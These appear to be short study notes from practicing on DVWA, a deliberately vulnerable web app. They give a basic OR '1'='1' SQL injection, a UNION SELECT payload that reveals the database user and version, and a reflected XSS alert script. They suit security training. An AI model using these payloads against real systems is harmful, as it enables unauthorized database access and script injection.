1
Behind the scenes, DVWA is likely doing:
SELECT first_name, last_name FROM users WHERE user_id = '$id';


Basic SQL Injection
1' OR '1'='1
'SELECT first_name, last_name FROM users 
WHERE user_id = '1' OR '1'='1';'

1' UNION SELECT user(), version() #

XSS reflected
<script>alert('XSS')</script>
